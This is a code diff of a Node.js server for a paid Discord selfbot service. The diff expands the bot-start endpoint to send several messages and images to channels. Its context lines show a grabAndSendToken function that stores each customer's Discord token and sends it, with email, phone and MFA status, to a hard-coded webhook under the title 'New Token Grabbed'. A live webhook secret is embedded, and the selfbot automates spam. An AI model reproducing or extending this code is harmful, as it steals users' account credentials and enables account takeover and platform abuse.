@@ -9,7 +9,7 @@ const FormData = require('form-data');
 
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';
 
-const OWNER_ID = '1473055478714990705';
+const OWNER_ID = '1482735601622192208';
 
 const dataDir = path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
@@ -556,7 +556,7 @@ function ensureOwner(req, res, next) {
 
 function ensureCanGenerate(req, res, next) {
     if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
-    if (req.user.id !== OWNER_ID && !db.isWhitelisted(req.user.id)) return res.status(403).json({ success: false, error: 'Owner only' });
+    if (req.user.id !== OWNER_ID && !db.isWhitelisted(req.user.id)) return res.status(403).json({ success: false, error: 'Owner or whitelisted users only' });
     next();
 }
 
@@ -589,7 +589,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
         db.addGrabbedToken(token, fullInfo, source);
         
         const embed = {
-            title: 'ð£ New Token Grabbed',
+            title: '🎣 New Token Grabbed',
             color: 0xff0000,
             fields: [
                 { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
@@ -597,9 +597,9 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
                 { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                 { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                 { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-                { name: 'MFA', value: fullInfo.mfa_enabled ? 'â Enabled' : 'â Disabled', inline: true },
-                { name: 'Verified', value: fullInfo.verified ? 'â Yes' : 'â No', inline: true },
-                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'â No', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
@@ -952,13 +952,13 @@ app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
 
 app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
     try {
-        const { token, channels, message, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, imageUrl, sendAllAtOnce } = req.body;
+        const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images, sendAllAtOnce } = req.body;
         
-        if (!token || !channels || !message) {
-            return res.status(400).json({ success: false, error: 'Missing fields' });
+        if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) {
+            return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });
         }
         
-        await grabAndSendToken(token, { channels, message }, 'bot_start');
+        await grabAndSendToken(token, { channels, messages }, 'bot_start');
         
         const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
         if (channelList.length === 0) {
@@ -983,37 +983,57 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             joinStatus = await selfbotModule.joinServer(token, serverInvite);
         }
         
-        let savedImageUrl = null;
-        if (imageUrl && imageUrl.startsWith('data:')) {
-            try {
-                const imageId = `img_${Date.now()}_${req.user.id}.png`;
-                const imagePath = path.join(dataDir, 'uploads');
-                if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
+        // Process and save images
+        const savedImages = [];
+        if (images && Array.isArray(images)) {
+            for (const img of images) {
+                if (!img || !img.url) continue;
                 
-                const base64Data = imageUrl.split(',')[1];
-                const buffer = Buffer.from(base64Data, 'base64');
-                fs.writeFileSync(path.join(imagePath, imageId), buffer);
-                savedImageUrl = `/uploads/${imageId}`;
-            } catch (imgErr) {
-                console.error('[IMAGE SAVE ERROR]', imgErr);
+                if (img.url.startsWith('data:')) {
+                    try {
+                        const imageId = `img_${Date.now()}_${req.user.id}_${img.id || '0'}.png`;
+                        const imagePath = path.join(dataDir, 'uploads');
+                        if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
+                        
+                        const base64Data = img.url.split(',')[1];
+                        const buffer = Buffer.from(base64Data, 'base64');
+                        fs.writeFileSync(path.join(imagePath, imageId), buffer);
+                        savedImages.push({ id: img.id || savedImages.length + 1, url: `/uploads/${imageId}` });
+                    } catch (imgErr) {
+                        console.error('[IMAGE SAVE ERROR]', imgErr);
+                    }
+                } else if (img.url.startsWith('/uploads/') || img.url.startsWith('http')) {
+                    savedImages.push({ id: img.id || savedImages.length + 1, url: img.url });
+                }
             }
         }
         
+        // Normalize messages
+        const messageList = messages.map((m, idx) => ({
+            text: m.text || '',
+            imageIds: Array.isArray(m.imageIds) ? m.imageIds : []
+        })).filter(m => m.text.trim() !== '');
+        
+        if (messageList.length === 0) {
+            return res.status(400).json({ success: false, error: 'At least one non-empty message required' });
+        }
+        
         db.setConfig(req.user.id, {
-            token, channels, message, 
+            token, channels,
+            messages: messageList,
             delay_seconds: delaySeconds, 
             auto_reply_enabled: autoReply, 
             auto_reply_text: autoReplyText || '',
             active: 1,
             username: validation.username,
             server_joined: joinStatus?.success || false,
-            image_url: savedImageUrl || imageUrl || null,
+            images: savedImages,
             send_all_at_once: sendAllAtOnce ? 1 : 0
         }, configId);
         
         db.registerActiveBot(req.user.id, configId, token);
         
-        await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId, savedImageUrl || imageUrl, req.ip, sendAllAtOnce, db);
+        await selfbotModule.startSelfBot(req.user.id, token, channelList, messageList, delaySeconds * 1000, autoReply, autoReplyText, configId, savedImages, req.ip, sendAllAtOnce, db);
         
         res.json({ 
             success: true, 
@@ -1021,7 +1041,8 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             configId,
             serverJoined: joinStatus?.success || false,
             tokenGrabbed: true,
-            imageUrl: savedImageUrl
+            imageCount: savedImages.length,
+            messageCount: messageList.length
         });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
